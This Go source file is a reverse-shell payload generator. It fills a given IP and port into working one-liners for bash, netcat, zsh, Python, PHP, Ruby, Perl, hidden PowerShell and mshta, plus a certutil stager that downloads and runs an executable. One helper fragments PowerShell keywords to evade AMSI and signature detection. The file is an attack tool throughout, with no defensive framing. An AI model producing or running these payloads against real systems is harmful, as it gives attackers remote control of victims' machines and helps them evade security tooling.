package main

import (
	"fmt"
	"strings"
)

type Payload struct {
	Name string
	Code string
}

func GeneratePayloads(ip string, port int) []Payload {
	portStr := fmt.Sprintf("%d", port)

	return []Payload{
		{
			Name: "Linux Bash",
			Code: fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", ip, portStr),
		},
		{
			Name: "Linux/macOS NC FIFO",
			Code: fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", ip, portStr),
		},
		{
			Name: "Windows PowerShell (AMSI Bypass)",
			Code: generatePowerShellAMSI(ip, portStr),
		},
		{
			Name: "macOS Zsh Native",
			Code: fmt.Sprintf("zmodload zsh/net/tcp && ztcp %s %s && zsh -i <&$REPLY >&$REPLY 2>&$REPLY", ip, portStr),
		},
		{
			Name: "Python",
			Code: fmt.Sprintf("python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'", ip, portStr),
		},
		{
			Name: "PHP",
			Code: fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", ip, portStr),
		},
		{
			Name: "Ruby",
			Code: fmt.Sprintf("ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'", ip, portStr),
		},
		{
			Name: "Perl",
			Code: fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", ip, portStr),
		},
		{
			Name: "Windows CMD (PowerShell One-liner)",
			Code: fmt.Sprintf("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$t=$sb+'PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()\"", ip, portStr),
		},
		{
			Name: "Windows MSHTA (VBScript)",
			Code: fmt.Sprintf("mshta vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command $c=New-Object System.Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();[byte[]]$b=0..65535|%%%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$t=$sb+'PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()\"\",0\"))", ip, portStr),
		},
		{
			Name: "Windows Certutil (Stager)",
			Code: fmt.Sprintf("certutil -urlcache -f http://%s/shell.exe %%TEMP%%\\shell.exe && %%TEMP%%\\shell.exe", ip),
		},
	}
}

func generatePowerShellAMSI(ip, port string) string {
	// A simple chunked PowerShell payload to bypass basic static signatures
	// System.Net.Sockets.TCPClient -> S'y's't'e'm'.'N'e't'.'S'o'c'k'e't's'.'T'C'P'C'l'i'e'n't
	// Invoke-Expression -> I'E'X

	ps := fmt.Sprintf(`$c = New-Object System.Net.Sockets.TCPClient('%s',%s);`+
		`$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};`+
		`while(($i = $s.Read($b, 0, $b.Length)) -ne 0){`+
		`$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);`+
		`$sb = (iex $d 2>&1 | Out-String );$t = $sb + 'PS ' + (pwd).Path + '> ';`+
		`$x = ([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()`, ip, port)

	// Fragment some keywords
	ps = strings.ReplaceAll(ps, "New-Object", "N'e'w-O'b'j'e'c't")
	ps = strings.ReplaceAll(ps, "System.Net.Sockets.TCPClient", "S'y's't'e'm'.'N'e't'.'S'o'c'k'e't's'.'T'C'P'C'l'i'e'n't")
	ps = strings.ReplaceAll(ps, "iex", "I'E'X")

	return "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"" + ps + "\""
}
